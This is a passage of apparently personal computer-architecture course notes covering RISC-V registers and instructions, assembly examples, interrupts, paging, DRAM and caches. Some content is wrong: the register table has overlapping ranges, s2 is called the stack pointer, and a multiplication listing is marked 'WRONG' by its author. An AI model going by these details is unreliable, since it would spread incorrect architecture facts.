<tr><td style="text-align: center">x3</td><td style="text-align: center">gp</td><td style="text-align: center">Global Pointer</td><td style="text-align: center"></td></tr>
<tr><td style="text-align: center">x4</td><td style="text-align: center">tp</td><td style="text-align: center">Thread Pointer</td><td style="text-align: center"></td></tr>
<tr><td style="text-align: center">x5-x7</td><td style="text-align: center">t0-t2</td><td style="text-align: center">Temps</td><td style="text-align: center">caller</td></tr>
<tr><td style="text-align: center">x8</td><td style="text-align: center">s0 /fp</td><td style="text-align: center">saved / frame pointer (base pointer effectively)</td><td style="text-align: center">callee</td></tr>
<tr><td style="text-align: center">x9</td><td style="text-align: center">s1</td><td style="text-align: center">saved register</td><td style="text-align: center">callee</td></tr>
<tr><td style="text-align: center">x10-x11</td><td style="text-align: center">a0-a1</td><td style="text-align: center">Fn args/ return values</td><td style="text-align: center">callee</td></tr>
<tr><td style="text-align: center">x12-x18</td><td style="text-align: center">a2-a7</td><td style="text-align: center">Fn args</td><td style="text-align: center">caller</td></tr>
<tr><td style="text-align: center">x18-x27</td><td style="text-align: center">s2-s11</td><td style="text-align: center">Saved registers</td><td style="text-align: center">callee</td></tr>
<tr><td style="text-align: center">x27-x31</td><td style="text-align: center">t3-t6</td><td style="text-align: center">Temporaries</td><td style="text-align: center">caller</td></tr>
</tbody></table>
</div>
<blockquote>
<p>Maximum memory depends on the size of the address bus from the load store unit
to the memory.</p>
</blockquote>
<p>The caller saved registers have to be explicitly saved by the caller function
in a stack frame before calling the other function. On the other hand, callee
saved functions are guaranteed to stay the same across function calls and there
is no need for functions to save them.</p>
<h3 id="instructions"><a class="header" href="#instructions">Instructions</a></h3>
<p>The ones listed below are called <em>R-type</em> or <em>register-type</em> instructions.</p>
<ul>
<li>
<p><code>add rd, rs1, rs2</code>: add the contents of rs1 and rs2 and store it in rd.
Signed addition. Also has the unsigned version. Similarly, sub, and, or, xor
also exist.</p>
</li>
<li>
<p><code>mul/mulh rd, rs1, rs2</code>: multiplies and stores the lower/upper 32 bits in rd.</p>
</li>
<li>
<p><code>div/rem rd, rs1, rs2</code>: stores the quotient/remainder.</p>
</li>
<li>
<p><code>sll rd, rs1, rs2</code>: Left shift the number in rs1 by the value in rs2 and
store in rd.</p>
</li>
<li>
<p><code>srl rd, rs1, rs2</code>: Right shift the number in rs1 by the value in rs2 and
store in rd. Zero extends.</p>
</li>
<li>
<p><code>sra rd, rs1, rs2</code>: Right shift the number in rs1 by the value in rs2 and
store in rd. Sign extends.</p>
</li>
</ul>
<p>All of these also have an immediate version where the last argument is a
hardcoded literal.</p>
<p>These are called <em>I-type</em> or <em>immediate-type</em> instructions.</p>
<ul>
<li>
<p><code>l(b/h/w) rd, imm(rs1)</code>: loads a byte/half-word/word to rd(dest. register)
from *(rs1 + imm)</p>
</li>
<li>
<p><code>l(b/h/w)u rd, imm(rs1)</code>: loads a byte/half-word/word to rd(dest. register)
from *(rs1 + imm). This one zero-extends on the left.</p>
</li>
</ul>
<p>These are also <em>I-type</em> instructions.</p>
<p>The below one instruction is <em>S-type</em> instruction (for obvious reasons).</p>
<ul>
<li><code>s(b/h/w) rd, imm(rs1)</code>: stores a byte/half-word/word to *(rs1 + imm)
from the contents of rd.</li>
</ul>
<p>The below instruction is called <em>B-type</em> or <em>branch-type</em> instruction.</p>
<ul>
<li><code>blt/bltu r1, r2, label/offset</code>: if r1 &lt; r2 (signed or unsigned), jump to
label or symbol. Can jump to atmost 4 KiB. (13 bits with the lsb always 0, the
rest are used for determining values).</li>
</ul>
<p>The above instructions have greater than, greater than equal to variants as
well. Also immediate variants of all.</p>
<h4 id="function-calls-1"><a class="header" href="#function-calls-1">Function calls</a></h4>
<p>All of these can jump to at most 1 MiB as they take an immediate value of 20
bits apart from the lsb that’s always 0.</p>
<p>The below type is called a <em>J-type</em> instruction.</p>
<ul>
<li><code>jal rd, imm</code>: Jump to PC + imm, and store pc + 4 in register rd.</li>
</ul>
<p>The below one is an <em><strong>I-type</strong></em> and <strong>NOT</strong> J-type.</p>
<ul>
<li><code>jalr rd, rs1, imm</code>: Jump to rs1 + imm, storing PC + 4 in the register
rd. Used for function pointers.</li>
</ul>
<p>Both of the ones below are aliases.</p>
<ul>
<li>
<p><code>j label</code>: alias to <code>jal zero, label</code>, discards the return address</p>
</li>
<li>
<p><code>ret rs1</code>: return to the address in rs1, if no argument is specified use
ra (return addres register/x1). Alias to <code>jalr zero, rs1, 0</code></p>
</li>
</ul>
<p>For function calls we also need a stack-based execution. s2 register is the
stack pointer that points to the top of the stack. Frame pointer s0 saves the
base of the stack. These mark the stack frame in the stack.</p>
<blockquote>
<p>Always load and save values relative to the frame pointer.</p>
</blockquote>
<p>Registers a0 to a7 are used to pass function arguments from one function to
another. These are 8 parameters. If we have more, then you need to use the
stack.</p>
<h4 id="control-and-status-registers"><a class="header" href="#control-and-status-registers">Control and status registers</a></h4>
<ul>
<li>
<p><code>csrrw rd, csr, rs</code>: atomic swap values</p>
</li>
<li>
<p><code>csrrs rd, csr, rs</code>: atomic read from rd and set a bit</p>
</li>
<li>
<p><code>csrrc rd, csr, rs</code>: atomic read from rd and reset a bit</p>
</li>
</ul>
<p>Atomic means that interrupts won’t stop the entire set of operations that is
going on.</p>
<h3 id="executing-instructions"><a class="header" href="#executing-instructions">Executing instructions</a></h3>
<p>If we are using an operating system:</p>
<ul>
<li>Proxy Kernel is handling syscalls, mapping memory, program counter
according to memory map, etc.</li>
</ul>
<p>If we are without an operating system:</p>
<ul>
<li>Manually write the <code>.text</code> section to the flash memory.</li>
<li>Load the <code>.data</code> section to the RAM.</li>
<li>Set/reset the program counter to the required memory. It resets to a fixed
value called as <strong>reset vector</strong>.</li>
<li>Address out of range is your skill issue.</li>
<li>Instruction fetched by the <strong>Instruction Pointer</strong>. 32 bits in width.</li>
<li>Then it is sent to control ROM. This does not have microcodes and are instead
hardcoded using combinational circuit.</li>
</ul>
<h4 id="register-bank"><a class="header" href="#register-bank">Register Bank</a></h4>
<p>Has all the registers and 2 muxs + 1 demux to select the register to use. There
is <em>dual porting</em> to read two source registers at once (hence two muxes).</p>
<h4 id="program-counter"><a class="header" href="#program-counter">Program Counter</a></h4>
<p>This keeps track of the next instruction to be executed. Usually incremented by
4 unless branches. It resets to a fixed value called as <strong>reset vector</strong>.</p>
<p>Instructions and data are fetched every rising edge of the clock and that is
when the program counter is also incremented by 4.
The instruction fetched is later stored in the <strong>instruction register</strong>.</p>
<p>The instruction register sends it to the control unit which later sends signals
to whatever is responsible.</p>
<p>It also gets reset at interrupts to an interrupt vector and begins to consume
instructions from there.</p>
<h4 id="alu"><a class="header" href="#alu">ALU</a></h4>
<p>Performs arithmetic (no shit). Has the <strong>gen</strong> module before it that generates
the immediate instruction from the opcode, regardless of whether it was an
<em>I-type</em> or not.</p>
<p>After this, there is a 2:1 mux that has a select line coming from the Control
Unit that decides whether or not the immediate values has to be selected or not,
the other option being 0.</p>
<h2 id="multiprecision-arithmetic-in-riscv"><a class="header" href="#multiprecision-arithmetic-in-riscv">Multiprecision Arithmetic in RISCV</a></h2>
<p>Multiprecision addition</p>
<pre><code class="language-assembly">.data
# data goes here
iter: .word 0x2 # number of chunks
chunksize: .word 0x4 # bytes of the chunk, in this case word
var1: .word 0xffffffff
	.word 0x53535353
var2: .word 0x1
	.word 0x01010101
var3: .word 0x0
	.word 0x0

.section .text
.global main

main:
lw a1, iter 
lw a2, chunksize 
mul s1, a1, a2
xor s2, s2, s2 #i = 0
xor s3, s3, s3 #carry = 0

loop:
bgeu s2, s1, return # i &lt; k or exit

la t1, var1 #t1 = &amp;var1
add t1, t1, s2 #t1 = &amp;var1 + i
lw t1, 0(t1) #t1 = var1[i]

la t2, var2 #t2 = &amp;var2
add t2, t2, s2 #t2 = &amp;var2 + i
lw t2, 0(t2) #t2 = var2[i]

add t3, t1, t2 #sum = var1[i] + var2[i]
sltu s4, t3, t1 #first carry

add t4, t3, s3 #sum = sum + carry
sltu s5, t4, s3 #second carry

add s3, s4, s5 #final carry

la t3, var3
add t3, t3, s2
sw t4, 0(t3)

add s2, s2, a2
j loop

return:
ret
</code></pre>
<p>Multiprecision subtraction</p>
<pre><code class="language-assembly">.data
# data goes here
iter: .word 0x2 # number of chunks
chunksize: .word 0x4 # bytes of the chunk, in this case word
var1: .word 0xffffffff
	.word 0x53535353
var2: .word 0x1
	.word 0x01010101
var3: .word 0x0
	.word 0x0

.section .text
.global main

main:
lw a1, iter 
lw a2, chunksize 
mul s1, a1, a2
xor s2, s2, s2 #i = 0
xor s3, s3, s3 #carry = 0

loop:
bgeu s2, s1, return # i &lt; k or exit

la t1, var1 #t1 = &amp;var1
add t1, t1, s2 #t1 = &amp;var1 + i
lw t1, 0(t1) #t1 = var1[i]

la t2, var2 #t2 = &amp;var2
add t2, t2, s2 #t2 = &amp;var2 + i
lw t2, 0(t2) #t2 = var2[i]

sub t3, t1, t2 #sum = var1[i] - var2[i]
sgtu s4, t3, t1 #first carry

sub t4, t3, s3 #sum = sum + carry
sgtu s5, t4, t3 #second carry

add s3, s4, s5 #final carry

la t3, var3
add t3, t3, s2
sw t4, 0(t3)

add s2, s2, a2
j loop

return:
ret
</code></pre>
<p>Multiprecision multiplication</p>
<p>This is WRONG!!!!</p>
<pre><code class="language-assembly">.data
# data goes here
iter: .dword 0x2 # number of chunks
chunksize: .dword 0x8 # bytes of the chunk, in this case word
var1: .dword 0x2222222222222222
	.dword 0x0000000000003333
var2: .dword 0x10
	.dword 0x3
var3: .dword 0x0
	.dword 0x0
	.dword 0x0
	.dword 0x0

.section .text
.global main

main:
ld a1, iter 
ld a2, chunksize 
mul s1, a1, a2 #adjusting max iterations to account for chunk size
xor s2, s2, s2 #i = 0
xor s4, s4, s4 #carry = 0

outer_loop:
bgeu s2, s1, return #i &lt; k or exit

la t1, var1 #t1 = &amp;var1
add t1, t1, s2 #t1 = &amp;var1 + i
ld t1, 0(t1) #t1 = var1[i]

xor s3, s3, s3 #j = 0

inner_loop:
bgeu s3, s1, inner_end # j &lt; k or exit

la t2, var2 #t2 = &amp;var2
add t2, t2, s3 #t2 = &amp;var2 + j
ld t2, 0(t2) #t2 = var2[j]

mul t3, t1, t2 #lower bits of var1[i] * var2[j]
add t3, t3, s4 #add the previous carry here
mulh s4, t1, t2 #upper bits of var1[i] * var2[j] set as the new carry

la t4, var3 #t4 = &amp;var3
add t4, t4, s2 #t4 = &amp;var3 + i
add t4, t4, s3 #t4 = &amp;var3 + i + j

ld t5, 0(t4) #fetch whatever the previous value in that block was
add t5, t5, t3 #add the current multiplication to that value
sd t5, 0(t4) #store the final result

add s3, s3, a2 #j = j + 1
j inner_loop

inner_end:
add s2, s2, a2 #i = i + 1
j outer_loop

return:
ret
</code></pre>
<h2 id="function-call-examples-in-riscv"><a class="header" href="#function-call-examples-in-riscv">Function call examples in RISCV</a></h2>
<p>Recursive fibonacci</p>
<pre><code class="language-assembly">.data
# data goes here
fib_in: .dword 0xa #the 3rd fibonacci number
fib_out: .dword 0 #output is stored here

.section .text
.global main

main:
addi sp, sp, -0x8 #create stack frame
sd ra, 0(sp) #store return address of main
ld a0, fib_in #load the argument in the a0 reg

jal ra, fib #call the function with a0 = fib_in

la t1, fib_out #take the return value from the a1 reg 
sd a1, 0(t1) #store the return value in the required place
ld ra, 0(sp) #load the return address
addi sp, sp, 0x8 #restore stack frame
ret

fib: #fib(k)

addi sp, sp, -0x20 #make the stack frame

sd ra, 0(sp) #store the return address
sd a0, 0x8(sp) #store the argument

li t0, 2 #if a0 == 1 || a0 == 2
bleu a0, t0, fib_done #leave

addi a0, a0, -0x1 #a0 = a0 - 1
jal ra, fib #fib(k - 1)
sd a1, 0x10(sp) #t1 = fib(k-1)

addi a0, a0, -0x1 #store fib(k - 1)
jal ra, fib #fib(k - 2)
sd a1, 0x18(sp) #store fib(k - 2)

ld t1, 0x10(sp)
ld t2, 0x18(sp)
add a1, t2, t1 #a1 = fib(k - 1) + fib(k - 2)
  

ld ra, 0(sp) #restore return address
ld a0, 0x8(sp) #restore a0
addi sp, sp ,0x20 #restore stack frame
ret

fib_done:
ld ra, 0(sp) #restore return address
ld a0, 0x8(sp) #restore 
li a1, 0x1 #send value
addi sp, sp, 0x20 #restore stack frame

ret
</code></pre>
<h2 id="peripherals"><a class="header" href="#peripherals">Peripherals</a></h2>
<p>They are also mapped to the memory. And properties can be changed using that
memory area.</p>
<p>The driver can be blocking or non-blocking. If blocking, it takes up a lot of
CPU power as it keeps polling the peripheral for data.
If it is non-blocking, then there are interrupts then they are detected at
hardware level within a clock cycle.</p>
<h3 id="interrupts"><a class="header" href="#interrupts">Interrupts</a></h3>
<p>If there is an interrupt, then the program jumps to the supplied <strong>interrupt
service routine</strong> and starts executing from there and returns to the OG
instruction once everything is done.</p>
<p>Hardware interrupts are done by a bus manager like the network controller (that
straight away receives a bunch of kilobytes) and use <em>DMA</em> (Direct Memory
Access) to straight away start using the memory.</p>
<p>There are software interrupts (for accessing devices like IO, sockets, etc.)
and hardware interrupts for, well, other stuff.</p>
<p>Apart from that there are exceptions as well that are raised by the CPU when
buttfuckery like division by 0 happens.</p>
<p>All the peripherals are connected to the <strong>PLIC</strong> (<em>Platform Level Interrupt
Controller</em>). There is also <strong>CLINT</strong> (<em>Control Local Interrupt Timer</em>) that
gives each core timer interrupts
that can be used a scheduler.</p>
<p>Interrupts have modes that define previlege level:</p>
<ul>
<li>Machine level: M mode, most privileged</li>
<li>Supervisor level: S mode, OS privilege</li>
<li>User level: U mode, all binaries run here</li>
</ul>
<blockquote>
<p>In Intel machines these are called rings.</p>
</blockquote>
<h3 id="interrupt-handling"><a class="header" href="#interrupt-handling">Interrupt Handling</a></h3>
<h4 id="what-caused-the-interrupt"><a class="header" href="#what-caused-the-interrupt">What caused the interrupt?</a></h4>
<p><code>mcause</code> has the first bit reserved for the interrupt type (interrupt or error)
and the rest 31 bits are used for indicating the subtype of the interrupt.</p>
<p>If the first bit is 1 then it was an interrupt else it was an exception.</p>
<p>To find out what peripheral caused the interrupt, the CPU uses the value given
by <em>PLIC</em>.</p>
<p>Filled automatically by the hardware when an interrupt happens.</p>
<h4 id="where-is-the-interrupt-vector-address"><a class="header" href="#where-is-the-interrupt-vector-address">Where is the interrupt vector address?</a></h4>
<p><code>mtvec</code> stores the address of the interrupt vector.</p>
<p>If the <em>mode</em> value is set to 1, it is <strong>vectored</strong>. The <code>pc</code> is set to
<strong>BASE + 4 * cause</strong>.</p>
<p>If <em>mode</em> is set to 0, it is a <strong>direct</strong> interrupt and all exceptions set
<code>pc</code> to <strong>BASE</strong>.</p>
<p>2 and 3 are reserved for future use.</p>
<blockquote>
<p>NOT hardcoded!!</p>
</blockquote>
<h4 id="where-to-return-to"><a class="header" href="#where-to-return-to">Where to return to?</a></h4>
<p><code>mepc</code> holds the value of <code>pc</code> when the interrupt occured.</p>
<p><code>mret</code> instruction loads the <code>mepc</code> to the <code>pc</code>.</p>
<h4 id="what-was-the-previous-status-level"><a class="header" href="#what-was-the-previous-status-level">What was the previous status level?</a></h4>
<p><code>mstatus</code> register has 4 bits that are mostly relevant to us.</p>
<p><code>MPP[1:0]</code> stores the previous execution mode. These are the 12th and 11th LSB,
0 indexed.</p>
<ul>
<li>User mode: 00</li>
<li>Supervisor mode: 01</li>
<li>Machine mode: 11</li>
</ul>
<p><code>MPIE</code> holds the interrupt enable status in the previous mode. This is used to
determine if the previous mode had interrupts enabled for the lower privileges.
This is the 7th LSB, same scheme as above.</p>
<p><code>MIE</code> holds the interrupt enable status in the current mode. 3rd LSB, same
scheme.</p>
<h3 id="nested-interrupts"><a class="header" href="#nested-interrupts">Nested interrupts</a></h3>
<p>To enable a nested interrupt, copy the data from <code>mepc</code>, <code>mcause</code> and <code>mstatus</code>.</p>
<p><code>mie</code> register enables interrupts in machine mode if set. It is set to zero at
the start of the interrupt to make sure no other interrupts disturb the copying
of the data during a nested interrupt.</p>
<ul>
<li>11th bit for external/DMA interrupt.</li>
<li>7th bit for timer interrupt.</li>
<li>3rd bit for Software interrupt.</li>
</ul>
<p>These are 0 indexed LSBs.</p>
<h3 id="pending-interrupts"><a class="header" href="#pending-interrupts">Pending Interrupts</a></h3>
<p><code>mip</code> register holds the important bits for any interrupt that wasn’t executed
in between an instruction.</p>
<p>Bit scheme is the same as above.</p>
<h2 id="virtual-memory-addressing"><a class="header" href="#virtual-memory-addressing">Virtual Memory Addressing</a></h2>
<p>We introduce a <strong>paging unit</strong> between physical memory and the CPU, which is
unique for every process.</p>
<p>RAM is split into multiple page frames (usually 4 KiB). The virtual memory is
also split into multiple chunks of 4KiB size. These two chunks are then mapped
in some fashion which is stored in the <strong>process page table</strong>.</p>
<p>While scheduling, the program has an active page table that is maintained during
the program’s runtime. In some cases, pages from multiple programs are loaded
simultaneously to the memory.</p>
<h3 id="demand-paging"><a class="header" href="#demand-paging">Demand Paging</a></h3>
<p>Virtual memory takes advantage of the fact that not all blocks need to be loaded
at once for the program to be executed. Hence, the paging table also has a value
called present bit that tells you if the page is present in the CPU or not.</p>
<p>If a page is not loaded when it was supposed to be, the program raises an
interrupt called <strong>page fault exception</strong>. There is a page fault exception
handler that takes care of loading the page and fill the page table. It may
remove a page frame of some other process if necessary.</p>
<p>There is another bit that keeps track of whether or not a page needs to be
written back to <em>swap</em> because of data updation. If the dirty bit is set to <em>1</em>,
we write stuff back to the swap. Else we don’t to save memory operations.</p>
<p>There are also protection bits for each page to indicate the permissions of
each page. These are used for maintaining stuff like the code
being readable, stack being non-executable, etc.</p>
<p>Usually there are 2 level paging, where one table has the address of another
sub-table and there is an offset that are used together to obtain the memory.</p>
<h3 id="shared-memory"><a class="header" href="#shared-memory">Shared memory</a></h3>
<p>If two programs have the same page frame, then they share the same memory
physically that lets them have a common shared memory (eg. glibc sharing,
VDSO in linux).
You can also duplicate a page within a program by pointing two blocks to the
same frame.</p>
<h3 id="2-level-paging"><a class="header" href="#2-level-paging">2 level paging</a></h3>
<p>The virtual address has the first 10 bits as offset from the
<strong>page table base register</strong>. This gives you the exact address of the page
table from the page directory. The next 10 bits store the offset from the base
of the page table. From this value the first 22 bits of the physical address
are obtained. The last 12 bits for both virtual and physical address are the
same. This scheme supports page directory sizes of 4KB and 2 MB.</p>
<p>For the <em>satp</em> register (the page table base register), the MSB will indicate
that translation is on or not. The next 9 bits are just meant for address space
separation for different processes. The next 22 bits hold the address of the
first level directory of the page translation.</p>
<p>The page table format is as follows:</p>
<div class="table-wrapper"><table><thead><tr><th>PPN[1]</th><th>PPN[0]</th><th>RSW</th><th>D</th><th>A</th><th>G</th><th>U</th><th>X</th><th>W</th><th>R</th><th>V</th></tr></thead><tbody>
<tr><td>12: physical page number</td><td>10: physical page number</td><td>2: reserved for OS</td><td>1: Dirty (0 for non-leaf)</td><td>1: Accessed (0 for non-leaf)</td><td>1: set to check whether the mapping is valid or not for all virtual address spaces, usually only used by the OS</td><td>1: User mode</td><td>1: execution bit</td><td>1: write bit</td><td>1: read bit</td><td>1: valid bit</td></tr>
</tbody></table>
</div>
<p>The PPN[1] + PPN[0] of the first level are used to get the address of the
second level table. Once we get that, we use the PPN[1] + PPN[0] to get the
first 22 bits of the <strong>34 bit</strong> physical page address. The last 12 bits are the
offset bits from the OG virtual page address. 34 bits somehow work??</p>
<h3 id="3-level-paging"><a class="header" href="#3-level-paging">3 level paging</a></h3>
<p>This is done for 64 bit architecture. This comes in two variants:</p>
<ul>
<li>39 bit addressing</li>
<li>48 bit addressing</li>
</ul>
<h4 id="39-bit"><a class="header" href="#39-bit">39 bit</a></h4>
<p>This scheme can support page table directories of sizes 4KB, 2MB, 1GB. The most
significant 25 bits are unused. There are a total of <data class="katex-src" value="2^{27}"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>27</mn></msup></mrow><annotation encoding="application/x-tex">2^{27}</annotation></semantics></math></span></data> page table entries
. Once again, last 12 bits are the same.</p>
<p>The page table entry is as follows:</p>
<div class="table-wrapper"><table><thead><tr><th><em>Reserved</em></th><th>PPN[2]</th><th>PPN[1]</th><th>PPN[0]</th><th>RSW</th><th>D</th><th>A</th><th>G</th><th>U</th><th>X</th><th>W</th><th>R</th><th>V</th></tr></thead><tbody>
<tr><td>10: reserved for future use</td><td>26: physical page number</td><td>9: physical page number</td><td>9: physical page number</td><td>2: reserved for OS</td><td>1: Dirty (0 for non-leaf)</td><td>1: Accessed (0 for non-leaf)</td><td>1: set to check whether the mapping is valid or not for all virtual address spaces, usually only used by the OS</td><td>1: User mode</td><td>1: execution bit</td><td>1: write bit</td><td>1: read bit</td><td>1: valid bit</td></tr>
</tbody></table>
</div>
<p>Once again, all of PPN[2] + PPN[1] + PPN[0] bits will be used to find the
page directory beginning in the subsequent levels.</p>
<h2 id="von-neumann-architecture"><a class="header" href="#von-neumann-architecture">Von Neumann Architecture</a></h2>
<p>Fetches the memory into various kinds of buffers to speed up memory fetch by
CPU.</p>
<h3 id="caches"><a class="header" href="#caches">Caches</a></h3>
<p>Each core has separate L1 cache for instructions and data. L2 cache is common
for both and mostly per-core (can also be shared across multiple cores). L3
cache is shared across all the cores.</p>
<h3 id="registers"><a class="header" href="#registers">Registers</a></h3>
<p>Apart from this there are also registers next to the ALU to speed up computation
. More can be slower or faster depending on the number. More means lesser loads
and stores. More also means longer routes (more time for pulse to travel) and
clock cycle logic to choose the register become slower.</p>
<h3 id="ram-memory"><a class="header" href="#ram-memory">RAM memory</a></h3>
<ul>
<li>Has capacitors.</li>
<li>Capacitors discharge over time hence needs to be continuously powered and
recharged.</li>
<li>Take time to charge and discharge, which creates bottlenecks for CPU.</li>
</ul>
<h4 id="dram"><a class="header" href="#dram">DRAM</a></h4>
<p>Flow of types through time:</p>
<ul>
<li>SDRAM: Synchronous DRAM</li>
<li>RDRAM: Rambus (company)</li>
<li>DDR DRAM: Double data rate - over here both rising and falling edges will
have actions.</li>
</ul>
<p>DIMM chips: Dual inline memory modules</p>
<p>There are two ranks, with 8 chips for each. One rank is on one side. Each bus
activates all the 8 chips at once.
This is more efficient as one DRAM chip can be held using 8 pins only. This
reduces size and number of pins (they are costly).</p>
<p>However, this activates all the 8 DRAM chips at once when we don’t need to, so
it is power inefficient.</p>
<p>For each DRAM cell, there are <strong>banks</strong>, each of which has 8 arrays. Each array
has 64 bits, however the data is stored so that all the 8 arrays store a bit
each for any byte.</p>
<p>Each array has a <em>RAS</em> (row access strobe) and a <em>CAS</em> (column access strobe).
There are 8 rows and 8 columns. Each row has 8 bits, <strong>but not from the
same byte</strong>. Those are parallel.</p>
<p>Each RAS has selects a row and each CAS selects a column to fetch a bit. All the
8 bits from each of the array combine to form a byte. Therefore a bank stores
64 bytes but in parallel.</p>
<p>In each DRAM chip, at one time, only one bank works. The index of the bank is
the same for all the chips.</p>
<p>Each bank sends out a byte (we’ll talk about bursts later).</p>
<p>It takes 9 bits to address a bit in DRAM. 3 for the array (8 in a bank), 3 for
the row, and 3 for the memory.</p>
<p>Steps for accessing a bit:</p>
<ul>
<li>Row address sent through RAS. Activates the entire row.</li>
<li>All the charge in the row stored in the <em>Sense Amplifier</em>.</li>
<li>CAS selects the bit and rest is sent back for recharging the capacitors.</li>
</ul>
<p>Step 1 is the slowest. To improve that:</p>
<p>Store multiple bits after step 2 in a buffer. This is called a <strong>burst</strong>.</p>
<p>Burst sizes:</p>
<ul>
<li>DDR2: 4 bytes</li>
<li>DDR3: 8 bytes</li>
<li>DDR4: 16 bytes</li>
</ul>
<p>The said buffer still sends out 8 bytes in 8 cycles. So, it takes 8 cycles for
1 burst. So a burst sends out 8 bytes per bank. This is stored in the row buffer
below the bank. Each DRAM chip uses one bank at a time. There are 8 DRAM chips,
so for a burst of 8 bytes, the total data sent in a burst is 64 bytes.</p>
<p>To improve upon it further, we do <strong>bank interleaving</strong>. How this happens is:</p>
<div class="table-wrapper"><table><thead><tr><th>T0</th><th>T1</th><th>T2</th><th>T3</th><th>T4</th><th>T5</th></tr></thead><tbody>
<tr><td>read req</td><td>read burst</td><td>recovery</td><td></td><td></td><td></td></tr>
<tr><td></td><td>read req</td><td>read burst</td><td>recovery</td><td></td><td></td></tr>
<tr><td></td><td></td><td>read req</td><td>read burst</td><td>recovery</td><td></td></tr>
<tr><td></td><td></td><td></td><td>read req</td><td>read burst</td><td>recovery</td></tr>
</tbody></table>
</div>
<p>In the above each row is a separate bank. This approach always keeps the data
bus saturated.</p>
<!---TODO: Add DRAM refresh--->
<blockquote>
<p>Row hammer attack: When you activate rows that have one row in between such
that the row in between changes values due to EM fields.
Saltanat’s work</p>
</blockquote>
<h3 id="cache"><a class="header" href="#cache">Cache</a></h3>
<p>Uses 6 transistors and is much faster than DRAM but also much costlier.</p>
<p>Each memory line in DRAM is mapped to a memory line in the cache. It is usually
32 bytes or 64 bytes per cache line.</p>
<h4 id="direct-memory-mapping"><a class="header" href="#direct-memory-mapping">Direct Memory Mapping</a></h4>
<p>If there are L cache lines and A lines in the main memory, then the k’th line
is mapped to k mod L.</p>
<p>We have tag bits in the address, that are used to identify whether the addresses
match or not.</p>
<p>If the addresses don’t match, we have a cache miss and we fetch the bytes from
the DRAM chip again.</p>
<p>Example:</p>
<p>Assume a cache with 1024 cache lines -&gt; 10 bits for indexing the line.</p>
<p>Cache line size is 1 word (4 bytes) -&gt; 2 offset bits within the word.</p>
<p>Address size = 64 bits =&gt; tag size = 64 - 10 - 2 = 52 bits.</p>
<p>This is the 64 bit address.</p>
<p>Now for the cache line size</p>
<div class="table-wrapper"><table><thead><tr><th>valid</th><th>Tag</th><th>data</th></tr></thead><tbody>
<tr><td>1 bit</td><td>52 bits</td><td>32 bits</td></tr>
</tbody></table>
</div>
<p>The valid bit checks if the cache line is valid or not. Can be invalidated due
to concurrency.</p>
<p>The tag bits of address and the cache line are XORed to check if it’s the same.
If same, it is a hit. Then valid bit is checked. Finally data is fetched and the
offset is used to get the exact byte (if it is byte addressable).</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="csd"><a class="header" href="#csd">csd</a></h1>
<blockquote>
<p>Moore’s Law: The number of transistors in a dense integrated circuit doubles every two years.</p>
</blockquote>
<p>How to represent a bit (What makes a good bit):</p>
<ul>
<li>small and inexpensive</li>
<li>stable over time</li>
<li>easy and fast to manipulate</li>
</ul>
<h2 id="using-voltage-to-represent-bits"><a class="header" href="#using-voltage-to-represent-bits">Using voltage to represent bits</a></h2>
<ul>
<li>
<p>Ideal bit: 0 and 1</p>
</li>
<li>
<p>Real bit using voltage: noise, ranged</p>
</li>
<li>
<p>Voltage has a lower limit. 0 V - V<sub>L</sub> is interpreted as a <code>0</code>.</p>
</li>
<li>
<p>Higher limit; V<sub>H</sub> to 5 V is considered as a <code>1</code>.</p>
</li>
<li>
<p>Between that is a forbidden zone.</p>
</li>
</ul>
<h2 id="transistors"><a class="header" href="#transistors">transistors</a></h2>
<p>Two types, n type and p type.</p>
<p><img src="notes/./csd/1.png" alt="mosfets" /></p>
<p>N-type acts as a wire when given high voltage at the gate and acts as an open circuit when given a low voltage. P-type works exactly the other way around.</p>
<h3 id="logic-gates-using-mosfets"><a class="header" href="#logic-gates-using-mosfets">Logic gates using mosfets</a></h3>
<p><img src="notes/./csd/2.png" alt="Acts as a complement/NOT gate" /></p>
<p>Basically two complementary networks for pull-up and pull-down respectively. Pull up is made from pmos and nmos is used for pull down.</p>
<h4 id="duality"><a class="header" href="#duality">Duality</a></h4>
<p>To have the n type equivalent of a p type sub network, do the following:</p>
<ul>
<li>If A and B are in parallel in p type ( <data class="katex-src" value="\overline{A} + \overline{B}"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>A</mi><mo stretchy="true">‾</mo></mover><mo>+</mo><mover accent="true"><mi>B</mi><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">\overline{A} + \overline{B}</annotation></semantics></math></span></data> ), in n type they will be in series (<data class="katex-src" value="\overline{A\cdot B}"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mrow><mi>A</mi><mo>⋅</mo><mi>B</mi></mrow><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">\overline{A\cdot B}</annotation></semantics></math></span></data>).</li>
</ul>
<p>Also holds the other way.</p>
<h3 id="power-losses"><a class="header" href="#power-losses">Power losses</a></h3>
<ul>
<li>Static: <data class="katex-src" value="P_{static} = V_{DD} \cdot I_{leakage}"><span class="katex"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mrow><mi>s</mi><mi>t</mi><mi>a</mi><mi>t</mi><mi>i</mi><mi>c</mi></mrow></msub><mo>=</mo><msub><mi>V</mi><mrow><mi>D</mi><mi>D</mi></mrow></msub><mo>⋅</mo><msub><mi>I</mi><mrow><mi>l</mi><mi>e</mi><mi>a</mi><mi>k</mi><mi>a</mi><mi>g</mi><mi>e</mi></mrow></msub></mrow><annotation encoding="application/x-tex">P_{static} = V_{DD} \cdot I_{leakage}</annotation></semantics></math></span></data></li>
